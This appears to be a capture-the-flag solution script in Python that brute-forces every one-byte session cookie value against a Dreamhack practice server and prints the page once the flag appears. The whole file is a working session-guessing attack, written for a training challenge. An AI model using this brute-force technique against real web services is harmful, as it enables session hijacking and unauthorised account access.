import requests

url = 'http://host1.dreamhack.games:19756/'

for sessionid in range(0x100):
    cookie = {'sessionid': bytes([sessionid]).hex()}
    print(cookie)
    res = requests.get(url, cookies=cookie)
    if 'flag is' in res.text:
        print(res.text)
        break